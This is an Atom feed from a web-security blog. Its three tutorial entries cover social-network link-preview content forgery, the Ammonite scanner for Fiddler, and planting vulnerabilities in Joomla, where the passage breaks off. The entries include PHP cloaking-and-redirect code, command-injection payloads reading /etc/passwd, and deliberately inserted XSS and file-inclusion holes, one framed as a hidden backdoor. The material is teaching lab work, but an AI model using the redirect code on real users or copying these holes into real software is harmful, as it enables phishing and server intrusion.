@@ -1,0 +1,986 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: web-application-security | Prateek Gianchandani]]></title>
+  <link href="http://prateek147.github.io//categories/web-application-security/atom.xml" rel="self"/>
+  <link href="http://prateek147.github.io/"/>
+  <updated>2016-06-07T09:12:32+04:00</updated>
+  <id>http://prateek147.github.io/</id>
+  <author>
+    <name><![CDATA[Prateek Gianchandani]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Abusing Social Networking Sites to Perform Content Forgery]]></title>
+    <link href="http://prateek147.github.io/2013/06/13/abusing-social-networking-sites-to-perform-content-forgery"/>
+    <updated>2013-06-13T22:38:00+04:00</updated>
+    <id>http://prateek147.github.io/2013/06/13/abusing-social-networking-sites-to-perform-content-forgery</id>
+    <content type="html"><![CDATA[<p>Web Application vulnerabilities in social networking sites is very common these days. In this article we will be discussing a vulnerability found in Social networking sites because of which it is possible to spoof the content shown to the user. Basically whenever someone wants to share, post or send a link on Facebook or some other social networking site, a request goes through from their servers to the link which the user wants to share. This happens because Facebook (or that particular social networking site) wants to display a quick snapshot of what appears in the link to the user. However, these requests by social networking sites are easily identifiable because of the user-agent field in the headers of the incoming requests to the server or through their source IP address that resolves to a particular domain name. Hence it is possible for a malicious person to differentiate between the requests coming from the social networking sites and those coming from the users. The attacker can then display a simple image when the request is coming from Facebook so that on Facebook the snapshot appears to be that of a simple image. However when the user clicks on the link on Facebook, the attacker can know that the request is from the user by checking the user-agent field and redirect him to a malicious website. </p>
+
+
+
+
+<!-- more -->
+
+
+
+
+<h2>That Easily Identifiable Request</h2>
+
+
+
+
+<p>Let's say i want to share a link http://google.com on my Timeline. Whenever i type the link, Facebook automatically identifies it as a url and sends a request to http://google.com. This is because it wants to display a quick snapshot of what actually appears to be in the link. As we can see from the image below, Facebook has displayed a quick snapshot of how http://google.com appears like today. </p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/content-forgery/1.png" width="411" height="299" alt="1"></p>
+
+<p> These requests to the google.com server are easily identifiable because the user-agent of the incoming request is an indication of the social networking site being used or the IP address of the incoming request resolves to a particular domain name. For e.g Facebook uses a custom user-agent with the name "facebookexternalhit" and have their IP addresses resolve to tfbnw.net whereas Google+ uses a custom user-agent with the name "Feedfetcher-Google". </p>
+
+
+
+
+<p>By using some custom php code like  "$_SERVER['HTTP_USER_AGENT']" to get the user-agent value and "gethostbyaddr($_SERVER['REMOTE_ADDR'])" to resolve the IP address we can easily identify whether the request is coming from a social networking site like Google+ or Facebook or just a regular user.</p>
+
+
+
+
+<h2>Implementation</h2>
+
+
+
+
+<p>One of the most important things in order to implement this is to have a domain and an access to a publicly reachable server. We will have a .jpg on our server which will have the php code to identify the user-agent or IP address and display the response accordingly. However in order for the php code to be run in the jpg file, the jpg file must be interpreted as a php file by the server. The following two lines when added in the .htaccess file will serve our purpose. The code has been taken from http://www.blackhatacademy.org/security101/Facebook </p>
+
+
+<p>``` php</p>
+
+<pre><code>AddType x-httpd-php .jpg
+AddHandler application/x-httpd-php .jpg
+</code></pre>
+
+<p>```</p>
+
+<p>The first line assures that any .jpg file will be interpreted as a php file whereas the second line assures that any file with the externsion .jpg will be treated as a php program. </p>
+
+
+
+
+<p>Once this is done, we need to have the php code in our .jpg file on the server. The following lines of code demonstrate the exploit code for Facebook, Google+ and Websense. The code has been taken from <a href ="http://www.blackhatacademy.org/security101/Facebook">http://www.blackhatacademy.org/security101/Facebook</a>  with the comments and the code a bit modified.  </p>
+
+
+<p>``` php</p>
+
+<pre><code>&lt;?php
+# User agent checking methods
+#user-agent string for Facebook
+$fb_string = '/facebookexternal/i'; 
+#user-agent string for GooglePlus             
+$gplus_string = '/Feedfetcher-Google/i';       .
+# rDNS Lookup Methods
+# Websense Host 
+$host_websense = '/websense.com/i';
+# facebook host         
+$host_fb = '/tfbnw.net/i';                              
+# Load the request properties
+# Load the user-agent
+$u_agent = $_SERVER['HTTP_USER_AGENT'];
+# Load the http-referrer
+$u_ref     = $_SERVER['HTTP_REFERER'];
+#Resolve the Remote address to a domain
+$u_host  = gethostbyaddr($_SERVER['REMOTE_ADDR']);
+# If we're coming from or facebook or websense or google plus, 
+if (preg_match($host_fb,$u_host) || preg_match($host_websense,$u_host) || preg_match($fb_string,$u_agent) || preg_match($gplus_string,$u_agent)) {
+    # Display an image
+    header('Content-Type: image/jpeg');
+    @readfile ('/var/www/localhost/cute_kitten.jpeg');
+} else {
+    # Rickroll this unsuspecting user
+    header('Location: http://evilsite.com');
+}
+?&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>The code is pretty simple to understand. We check the user-agent, and the IP address of the incoming request. If the user-agent is identified as that of either Facebook, Google Plus or Websense then we know that this could be a request to take a snapshot of the url. Hence we display an image present on our server. Note that we also need to modify the Content-Type of the response to make it appear as an image. Hence on the social networking site, say Facebook, the snapshot of the url appears to be an image. However when the user clicks on the url, this time the user-agent is not of Facebook, Google+ or Websense rather it is the user-agent of the user itself. The php code identifies this as a regular user and redirects him to his malicious website (in this case evilsite.com). </p>
+
+
+
+
+<p>Similarly the POC code for Reddit is demonstrated below. This code has been taken from <a href="http://www.chokepoint.net/?id=5">http://www.chokepoint.net/?id=5</a></p>
+
+
+<p>``` php</p>
+
+<pre><code>&lt;?php
+# User agent checking methods
+$reddit_string = '/redditbot/i';
+# Load the request properties
+$u_agent = $_SERVER['HTTP_USER_AGENT'];
+# If we're coming from or facebook or websense or google plus, 
+if ( preg_match($reddit_string, $u_agent) ) {
+    # Display an image
+    header('Content-Type: image/jpeg');
+    header('Content-Transfer-Encoding: binary');
+    header('Content-Length: ' .  filesize('real_image.jpeg'));
+    @readfile ('real_image.jpeg');
+} else {
+    # Rickroll this unsuspecting user
+    header('Location: http://www.youtube.com/watch?v=dQw4w9WgXcQ');
+}
+?&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>Their is also a POC facebook application available at <a href ="http://www.chokepoint.net/?id=5">http://www.chokepoint.net/?id=5</a>. It allows us to input an image and a redirect URL. As you can see below, i have given the input image as the image of the Google Logo whereas the redirect url is http://youtube.com.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/content-forgery/2.png" width="700" height="643" alt="2"></p>
+
+<p>Once this is done, click on Submit. You will see a like button, a send button as well as a Reddit this! button appear. You can now send this request to yourself to check this vulnerability. </p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/content-forgery/4.png" width="700" height="599" alt="4"></p>
+
+<p>Here is how the sent message looks like. As you can see, the snapshot contains the image of the google URL. </p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/content-forgery/3.png" width="441" height="212" alt="3"></p>
+
+<p>However, when we click on the url, we will be redirected to youtube.com. Try this yourself to see !  </p>
+
+
+
+
+<h2>Protection Against Content Forgery</h2>
+
+
+
+
+<p>One of the ways to prevent from Content Forgery is to spoof the user-agent field to look like it is coming from a normal user. Another method could be to spoof the user-agent field as the user-agent of the user itself (i.e the user who is sharing or posting the link).</p>
+
+
+
+
+<h2>Conclusion</h2>
+
+
+
+
+<p>In this article we looked at a vulnerability which is caused due to the fact that the request made by Social Networking sites are easilty identifiable. These requests can hence be filtered out from the actual requests by the users. We looked at how this allows us to spoof the content which is actually appearing on the site. This could be used to redirect the users to malicious web pages through these Social networking sites simply because the original snapshot of the url looks pretty simple and unharming. </p>
+
+
+
+
+<h2>References</h2>
+
+
+
+
+<ol>
+    <li><p>Facebook-Security 101</br><a href="http://www.blackhatacademy.org/security101/Facebook">http://www.blackhatacademy.org/security101/Facebook</a></p></li>
+    <li><p>Facebook and Reddit Content Forgery</br><a href="http://www.chokepoint.net/?id=5">http://www.chokepoint.net/?id=5</a></p></li>
+    <li><p>XSCF</br><a href="http://www.blackhatacademy.org/security101/XSCF">http://www.blackhatacademy.org/security101/XSCF</a></p></li>
+</ol>
+
+
+
+
+<p>This article was originally published on the <a href="http://resources.infosecinstitute.com/">resources</a> page at <a href="http://infosecinstitute.com/">Infosec Institute</a>. For more information, please visit my author <a href="http://resources.infosecinstitute.com/author/prateek/">page</a>.</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Scanning the web with Ammonite]]></title>
+    <link href="http://prateek147.github.io/2013/06/13/scanning-the-web-with-ammonite"/>
+    <updated>2013-06-13T22:09:00+04:00</updated>
+    <id>http://prateek147.github.io/2013/06/13/scanning-the-web-with-ammonite</id>
+    <content type="html"><![CDATA[<p>Ammonite is a Fiddler extension used to scan web application for common vulnerabilities like verbose and blind SQL injection, OS commanding, local file inclusion, buffer overflows, format string vulnerabilities etc. Ammonite can also scan responses for important information like credit card numbers. Some of the unique features of Ammonite is its ability to test all sections of an HTTP Request for which includes headers (ever heard of SQL injection through HTTP headers ? ), cookies etc. One of the other features which is particularly interesting about Ammonite is the ability to pause, cancel and resume individual test cases. This is different than the conventional web scanners where the tests are executed in a particular order and we can just wait and watch if some test is taking a long time. Ammonite also has features for exporting requests in Python which aids in exploit development. We can also generate our own customised HTML report.</p>
+
+
+
+
+<!-- more -->
+
+
+
+
+<p>Please note that Ammonite is not a web exploitation tool. It is a lightweight web application scanner which is extremely fast and reliable. In this article, we will be looking at all the features of Ammonite through demonstrations.</p>
+
+
+
+
+<h2>Fiddler</h2>
+
+
+
+
+<p>Since Ammonite is an extension of Fiddler, it is important that you have a little bit of experience with Fiddler. Fiddler is a Web Debugging Proxy which allows us to inspect traffic for both HTTP and HTTPS. We can tamper data by setting our own custom rules or use breakpoints to observe and fiddle with specific requests and responses. If you have little or no experience will Fiddler, you can start by watching some introductory videos for Fiddler <a href="http://www.fiddler2.com/Fiddler/help/video/default.asp">here</a>. The figure below shows a screenshot of Fiddler in Action.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/1.png" width="1337" height="693" alt="1"></p>
+
+<h2>Setting up Ammonite</h2>
+
+
+
+
+<p>Ammonite can be bought from <a href ="http://ammonite.ryscc.com/buy.html">here</a>. There is also a 30 day free Trial version available. The first and foremost thing for Ammonite to work is to have Fiddler set up on your computer. Once this is done, open up the Ammonite setup file and follow along the instructions. In between it will also ask for the license file. You can get the license file from the Ammonite installation directory.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/2.png" width="432" height="340" alt="2"></p>
+
+<p>Once it is installed, restart Fiddler for the changes to take effect. You will see two new tabs named "Testing" and "Results" being added to Fiddler as shown in the figure below. This means Ammonite is now set up for use.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/3.png" width="577" height="122" alt="3"></p>
+
+<h2>First Look</h2>
+
+
+
+
+<p>Let's have a look at all the options that Ammonite provides us with. As you can see from the figure below, we have an option to choose from a various number of vulnerabilities like SQL Injection, Local File inclusion, Cross-Site Scripting etc. We can also perform passive checks to gather confidential information like credit card numbers etc. We also have the power to inject into all the different sections of an HTTP Request like headers, cookies etc which makes a lot of the advanced attacks (for e.g SQL injection through HTTP cookies) possible. We can also choose between Manual and Automatic mode. In Manual mode, you have to manually choose a web session and perform a vulnerability scan on it. In the automatic case, we have to specify the URL patterns that will be tested. We can also save the requests and responses to a file. We can set limits on the request timeout, change the number of requests per second, specify a limit on the maximum number of retries, and can also set the number of threads. We can skip testing with identical requests so that we can save time, stop testing on the first vulnerable parameter and can also skip automatic testing of media responses which include images, videos etc.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/4.png" width="917" height="336" alt="4"></p>
+
+<h2>Test Enviroment</h2>
+
+
+
+
+<p>In order to run the tool and see the results, we need a vulnerable test environment to perform all the scans on. In this case we will be using the "w3af test enviroment" to perform the scans on. w3af test environment is available on the Security Distro <i>Web Security Dojo</i> which can be downloaded from <a href="http://sourceforge.net/projects/websecuritydojo/files/">here</a> </p>
+
+
+
+
+<h2>Manual Testing</h2>
+
+
+
+
+<p><h4>1)Testing for OS Commanding</h4>-We will now be testing for OS commanding vulnerabilities in the test environment. To test it using Ammonite, simply browse to the vulnerable url. The url will appear on the left hand side under the Web Sessions section in Fiddler.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/5.png" width="673" height="248" alt="5"></p>
+
+<p><p>Once this is done, make sure Ammonite is configured according to our requirements. As it is clear from the figure below, i am only testing the url for some specific vulnerabilities like OS and blind command injection. Also, i have checked the <i>Skip media responses</i> and the <i>Skip identical requests</i> option.</p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/6.png" width="915" height="408" alt="6"></p>
+
+<p><p>Once this is done, you can just right click on the appropriate Web Session in Fiddler and go to Ammonite &mdash;> Test to start testing the session for vulnerabilities.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/7.png" width="878" height="477" alt="7"></p>
+
+<p><p>Once the test has run, you can see the Status down in the Running tests section. As it is clear from the figure below, Ammonite obtained 1 vulnerability with Risk Level <i>High</i>.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/8.png" width="916" height="381" alt="8"></p>
+
+<p><p>Go to the results tab to get a better idea of the vulnerability. As we can see from the figure below, Ammonite has given a clear description of the vulnerability along with the Remedy and the Reproduction steps. Another important thing to note is the information in the parameter section. The text under the parameter section reads <i>cmd: Original=ls Modified=ls | cat /etc/passwd # </i>. The thing below colon specifies the vulnerable parameter which in this case is <i>cmd</i>. The original parameter (in this case <i>ls</i>) is the one sent in the original request whereas the modified parameter (in this case <i>ls | cat /etc/passwd # </i>) is the one which actually led to identification of the vulnerability. This provides valuable information about what goes on under the hood.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/9.png" width="907" height="304" alt="9"></p>
+
+<p><p>If you are interested in learning more about the vulnerability, it is a good thing to look at the request and the response that led to its identification. We can see the vulnerable parameter being passed over as is clear from the Headers tab of the request. Fiddler allows us to see the request in may different forms and also see other information like the cookies, auth parameters as is clear from the different tabs.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/10.png" width="902" height="253" alt="10"></p>
+
+<p><p>From the response section, it is clear that the output corresponding to the input parameter (the os command) was found. Again, we can view the response in many different forms.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/11.png" width="912" height="308" alt="11"></p>
+
+<p><p><h4>2)Testing for Blind OS commanding</h4>-Ammonite can also detect blind OS commanding vulnerabilities. In case of blind OS commanding in which the response is not echoed in the output, Ammonite uses time delays to identify if a OS commanding vulnerability is present. For e.g if it sends a command which delays the response for some seconds, and if it notes a delay in the output, we can say that a blind OS commanding vulnerability is present. To test the session, simply right click on the web session and click on Ammonite&mdash;>Test</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/12.png" width="836" height="395" alt="12"></p>
+
+<p><p>The vulnerability is identified by Ammonite as shown in the figure below. From the parameters shown for identifying the vulnerability, we can see that a delay of 5 seconds (sleep 5) was sent.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/13.png" width="1005" height="591" alt="13"></p>
+
+<p><p><h4>3)Testing for Local File Inclusion</h4>-In this case, we are testing a Local File Inclusion vulnerability using Ammonite. We can just browse to the vulnerable url on the <i>w3af test environment</i>. Fiddler recognizes the session and now we can test it using Ammonite. The figure below shows that Ammonite identified the LFI vulnerability. We can see more info from the parameter information or from the Request/Response tabs.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/14.png" width="829" height="579" alt="14"></p>
+
+<p><p>From the figure below, we can also see that Ammonite was able to make some Content discovery. Let&rsquo;s have a closer look at what it found.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/15.png" width="835" height="586" alt="15"></p>
+
+<p><p>As we can see from the details below, Ammonite was able to find some other content while performing the tests. By looking at the parameter section, it is clear that when Ammonite entered the parameter <i>REST4</i> as <i>includes</i>, it found some content on the url which was created. It recognized this as an information leakage issue and reported it to us. Getting extra information like this could be valuable in a web application vulnerability scan. It also increases the attack surface of the web application.</p></p>
+
+<p><p><h4>4)Testing for Cross Site Scripting</h4>&ndash; Let&rsquo;s perform a test for Cross Site Scripting. We follow the same process again and perform a XSS check on the vulnerable url in the <i>w3af test environment</i>. As we can see, the vulnerability was identified as shown in the figure below.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/20.png" width="830" height="588" alt="20"></p>
+
+<p><p>Again, it is a good practice to look at the request and the response that led to the identification of the vulnerability.</p></p>
+
+<p><h2>Automated Testing</h2></p>
+
+<p><p>Uptil now, we have been performing manual scanning. In order to perform fast scanning over a large target surface, the whole process should be automatic. However, we don&rsquo;t want to scan every session url which Fiddler idenifies. In order to circumvent this issue, we use regular expressions to filter url&rsquo;s that we want to scan. To use Fiddler in automatic mode, simply check the <i>Automatic mode</i> in the Testing Options.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/22.png" width="833" height="441" alt="22"></p>
+
+<p><p>Once this is done, we need to specify a URL Filter to specify which url&rsquo;s we want to test on. For that, we will be using regular expressions. If you are performing a large scan, you should check the <i>Skip media responses</i> option which skips automatic testing for sessions with media responses. An example of  a regular expression would be <i>^www.example.com</i>. This will test all the url&rsquo;s which start with www.example.com.</li></p>
+
+<p><p>So lets perform an automated scan. I will be performing scans on all the urls on my local server with the IP address 10.0.1.24 . The appropriate url filter is set as shown in the figure below.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/23.png" width="828" height="352" alt="23"></p>
+
+<p><p>So now when we browse to any url on my local server, ammonite will start the scan automatically as shown in the figure below.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/24.png" width="834" height="470" alt="24"></p>
+
+<p><p>The results obtained by performing the scan are displayed in the figure below. We can see that ammonite was able to find a couple of vulnerabilities in the pages we browsed.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/25.png" width="831" height="675" alt="25"></p>
+
+<p><p>When performing a scan on a large target surface, it is essential to check only those vulnerabilities which we want to scan for. Otherwise, the scan may take a long time. One of the other advantages with Ammonite is that we can pause, resume or cancel any specific task. So if a task is taking too long, you might just want to stop it. We can also specify the various options like no of requests per second, timeout, number of threads etc in order to get the best performance.</p></p>
+
+<p><h2>Exporting Requests</h2></p>
+
+<p><p>Ammonite also allows us to export requests as <i>Python 2.7 urllib2</i> or <i>Python 3 urlib</i> code. This could be useful in cases where you would like to regenerate the request while doing some exploit development etc. In order to regenerate the request, right click on the request and click on <i>Export as Python 2.7 urllib2</i> or <i>Export as Python 3 urllib</i> as shown in the figure below.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/16.png" width="740" height="398" alt="16"></p>
+
+<p><p>Once this is done, we can see that Ammonite generated a function in Python which initializes the request, adds the required header fields and then return the request. Please note that we can also edit the function before saving it. So if i want to change the <i>User-Agent</i> field in the header, i can do that before saving the function.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/17.png" width="731" height="360" alt="17"></p>
+
+<p><h2>Generating Reports</h2></p>
+
+<p><p>Once the vulnerability scan has been performed, we can also generate HTML reports from the results of the scans. The generated report includes information like issue description, risk rating, reproduction steps, remediation instructions, and sample requests and responses. We can also filter the results based on a specific criteria or simply select the vulnerabilities which we want to be included in the report or we can choose a combination of both. </p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/18.png" width="834" height="346" alt="18"></p>
+
+<p><p>Once we have generated the report, we can save it as a html file. Here is how a sample report generated by Ammonite looks like.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/ammonite/19.png" width="1340" height="666" alt="19"></p>
+
+<p><h2>Conclusion</h2></p>
+
+<p><p>Ammonite is a Fiddler extension which allows us to scan web applications for common vulnerabilities. In this article we looked at some of the examples where ammonite helped us detect vulnerabilities like verbose and blind OS commanding, local file inclusion, cross site scripting etc. It can also identify information disclosure by scanning the response for important information like credit card numbers etc or finding out hidden forms etc. One of the other interesting features of Ammonite is that we can pause, cancel and resume individual test cases. Ammonite also allows us to export requests in Python and generate reports.</p></p>
+
+<p><h2>References:</h2>
+<ul>
+<li>Ammonite Features</br><a href ="http://ammonite.ryscc.com/features.html"><a href="http://ammonite.ryscc.com/features.html">http://ammonite.ryscc.com/features.html</a></a>
+</li>
+<li>Ammonite FAQ</br><a href="http://ammonite.ryscc.com/faq.html"><a href="http://ammonite.ryscc.com/faq.html">http://ammonite.ryscc.com/faq.html</a></a>
+</li>
+</ul></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Inserting Vulnerabilities in Web Applications]]></title>
+    <link href="http://prateek147.github.io/2013/06/13/inserting-vulnerabilities-in-web-applications"/>
+    <updated>2013-06-13T20:43:00+04:00</updated>
+    <id>http://prateek147.github.io/2013/06/13/inserting-vulnerabilities-in-web-applications</id>
+    <content type="html"><![CDATA[<p><p> In this article we will look at how we can insert vulnerabilities in web applications. Why? There are basically two reasons. Firstly, because it allows us to see the application from the eyes of a web developer and not a hacker. Secondly, because it allows us to create a platform where we can create a set of vulnerable web applications, and fuse them all together in a Virtual machine. So now, several people can test their web application security skills on the VM and learn from it. Some of the other reasons might be to leave a backdoor onto the server once the attacker has got access. Some of the backdoors could be very easily found out as they stand apart from the rest of the applications, but if the web application itself has been made vulnerable instead, then its a bit tough to detect it.<p></p>
+
+<p><!-- more --></p>
+
+<p><p>In this article we will be looking at some of the Open Source Web Applications, for e.g Joomla, phpMyAdmin etc, see what mechanisms the developers use to protect these application from OWASP Top 10 Web Application Vulnerabilities, and then look at how we can change the code to make the application vulnerable.<p></p>
+
+<p><p>The first and foremost thing to do is to change some of the configurations in the <i>php.ini</i> file of your server. There are some configurations in this file that may protect the web application from being exploited. In my case the php.ini was located in the location <i>/etc/php.ini</i>. In your case it might be different. Instead of changing the configuration of your main <i>php.ini</i> file, you can instead make a custom <i>php.ini</i> file in your web application which could overwrite the settings in the main <i>php.ini</i> file, though this may not work all the time. Hence we will go with editing the main <i>php.ini</i> file. Open up your <i>php.ini</i> file and make sure the following settings match with your php.ini file.<p></p>
+
+<p><pre>safe_mode = Off</pre></p>
+
+<p><p>The safe mode is used to prevent your server from getting exploited by blocking some of the dangerous functions like shell execution in php etc. According to <a href="http://php.net">php.net</a>, this feature has been DEPRECATED as of PHP 5.3.0. <p></p>
+
+<p><pre>register_globals = On</pre></p>
+
+<p><p>This setting allows the modification of global variables from the URL. For e.g if the url is <i><a href="http://infosecinstitute.com?q=infosec">http://infosecinstitute.com?q=infosec</a></i> then this means that the value of &ldquo;q&rdquo; can be changed depending upon the URL (in this case it is &ldquo;infosec&rdquo;). In case of a different url say <i><a href="http://infosecinstitute.com?q=test">http://infosecinstitute.com?q=test</a></i>, the value of q will be &ldquo;test&rdquo;. Hence it can be modified by just changing the URL. We will see later how this helps us while inserting File Inclusion vulnerabilities.<p></p>
+
+<p><pre>allow_url_fopen = On</pre></p>
+
+<p><p>This options allows the treatment of URL&rsquo;s as files.<p></p>
+
+<p><pre>allow_url_include = On</pre></p>
+
+<p><p>This option uses the function include, include_once, require, require_once to open URL&rsquo;s as files.<p></p>
+
+<p><pre>magic_quotes_gpc = Off</pre></p>
+
+<p><p>This disables the feature of php where it tries to escape any malicious characters which might corrupt the data or might perform an injection attack.<p></p>
+
+<p><pre>file_uploads = On</pre></p>
+
+<p><p>This allows the use of HTTP file uploads<p></p>
+
+<p><pre>display_errors = On</pre></p>
+
+<p><p>This feature allows the server to display errors. Though this might be a useful setting while development but it should not be set to ON once the web application is live. This is because the errors might leak sensitive information about the web application.<p></p>
+
+<p><p>Once you have made these changes, save the <i>php.ini</i> file (make sure that it is writable). Restart the server to make the changes come into effect.<p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/first.png" width="572" height="96" alt="First"></p>
+
+<p><p>The next step is to download Joomla, which is an open source Content Management System. Joomla can be downloaded from <a href="http://www.joomla.org/download.html">here.</a> Once it is downloaded, install in on your system and remove the installation directory. Once all of these steps are done, the Joomla home page should look like this.<p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/1.png" width="1052" height="731" alt="1"></p>
+
+<p><p>Let&rsquo;s go the Joomla directory and analyze the code. The joomla directory has a .htaccess file. Let&rsquo;s see what are the configurations in it. Open up the .htaccess file .<p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/2.png" width="713" height="452" alt="2"></p>
+
+<p><p>As we can see that their is a lot of interesting stuff here. Let&rsquo;s analyze them one by one.<p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/3.png" width="680" height="35" alt="3"></p>
+
+<p><p>This code is used to stop someone from using base64 encoding to perform attacks like script execution, login bypass etc.<p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/4.png" width="680" height="35" alt="3"></p>
+
+<p><p>Protection against Cross Site Scripting.<p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/5.png" width="711" height="39" alt="5"></p>
+
+<p><p>Protection against various types of Inclusion attacks like Local file inclusion and Remote file inclusion<p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/6.png" width="629" height="41" alt="6"></p>
+
+<p><p>Protection against File Inclusion attacks like Local file inclusion and Remote file inclusion and also SQL Injection to some extent. This is because the attacker might modify the parameters sent via GET or POST Request. <p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/7.png" width="713" height="43" alt="7"></p>
+
+<p><p>In case the user tries to browse somewhere he doesn&rsquo;t have access to.</p></p>
+
+<p><p>Now we know what to do. In order to insert vulnerablities into Joomla, these rules should not be there. Comment out these rules so that the file appears like this.<p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/8.png" width="713" height="452" alt="8"></p>
+
+<p><p><b>1) Inserting Reflected XSS (Cross Site Scripting)</b></p></p>
+
+<p><p>Let&rsquo;s say we add the following code to index.php file in Joomla<p></p>
+
+<p>``` php</p>
+
+<p>$name = $_GET[&lsquo;name&rsquo;];
+   if(isset($name))
+   {</p>
+
+<pre><code>   print "Welcome, ".$name;
+</code></pre>
+
+<p>   }
+   else
+   {</p>
+
+<pre><code>   print "Welcome, User ";
+</code></pre>
+
+<p>   }</p>
+
+<p>```</p>
+
+<p><p>The Joomla main page takes a name parameter in it&rsquo;s url and displays a welcome message at the top of the main page as shown in the figure below.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/9.png" width="1000" height="405" alt="9"></p>
+
+<p><p>We are right now not sure if the application is vulnerable to Cross Site Scripting, but we know that there is a possibility because the parameter we pass in the url is displayed in the main page without validating it. We also removed the checks for the <i>script</i> tag previously. Hence if we input some script as the parameter and it gets executed, then we know that it is definitely a vulnerability.</p></p>
+
+<p><p>Let&rsquo;s enter the following url in the input</p></p>
+
+<p><pre><a href="http://127.0.0.1/Joomla/index.php?name=%3Cscript%3Ealert%28%22This%20is%20definitely%20a%20vulnerability%22%29;%3C/script%3E">http://127.0.0.1/Joomla/index.php?name=%3Cscript%3Ealert%28%22This%20is%20definitely%20a%20vulnerability%22%29;%3C/script%3E</a></pre></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/10.png" width="1000" height="503" alt="10"></p>
+
+<p><p>The script gets executed and we are shown an alert. Hence we can confirm that we just inserted a XSS vulnerability in the application.</p></p>
+
+<p><b>2) Inserting LFI (Local File Inclusion) and RFI (Remote File Inclusion)</b></p>
+
+<p><p>Local file inclusion occur when it is possible to include a file on the server from the URL and see the content inside it. In this case, we will be inserting an LFI vulnerability in Joomla.</p></p>
+
+<p><p>Joomla allows us to create components, in this case we will be creating a custom component. To do this just make a folder named com_COMPONENTNAME in the components folder. In this case our component name would be <i>com_infosec</i>. </p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/11.png" width="920" height="305" alt="11"></p>
+
+<p><p>Copy all the files from any component and rename it according to the current component, i.e infosec. Once this is done, add the following code in it&rsquo;s infosec.php file.</p></p>
+
+<p>``` php
+if (isset($_REQUEST[&ldquo;imp_file&rdquo;])){</p>
+
+<pre><code>$imp_file = $_REQUEST["imp_file"];
+</code></pre>
+
+<p>}
+require_once($imp_file);
+```</p>
+
+<p><p>Note that we could have used the code <i>include_once</i> too. The only difference between them is that <i>include_once</i> will show an error in case the file is not found while <i>require_once</i> won&rsquo;t. From the code it is very clear that the infosec.php will take a file name as the parameter and then include it in the webpage. Since it is possible to modify the request variables because of the settings we changed earlier, it is possible to include any file from the server and display it in the browser. Let&rsquo;s try and display the </i>/etc/passwd</i> file.</p></p>
+
+<p><p>Go to the following url:</p></p>
+
+<p><pre><a href="http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=../../../../../etc/passwd">http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=../../../../../etc/passwd</a></pre></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/13.png" width="1709" height="903" alt="13"></p>
+
+<p><p>As we can see that we get a dump of the <i>/etc/passwd</i> file of the server. Note that the number of <i>&ldquo;../&rdquo;</i> might be different in your case. Hence we have successfully inserted a local file inclusion vulnerability in the web application. Please note that this is also a Remote file Inclusion vulnerability. Let&rsquo;s try and load up google.com on the Joomla home page.</p></p>
+
+<p><p>Go to the following url:</p></p>
+
+<p><pre><a href="http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=http://google.com">http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=http://google.com</a></pre></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/14.png" width="1000" height="892" alt="14"></p>
+
+<p><p>We just successfully loaded a remote url on Joomla&rsquo;s web page. Imagine the consequences of such a vulnerability. It is now possible to execute any remote script present anywhere on the web on the victim. </p></p>
+
+<p><p>Please note that sometimes the code which is responsible for including the file could be like this</p></p>
+
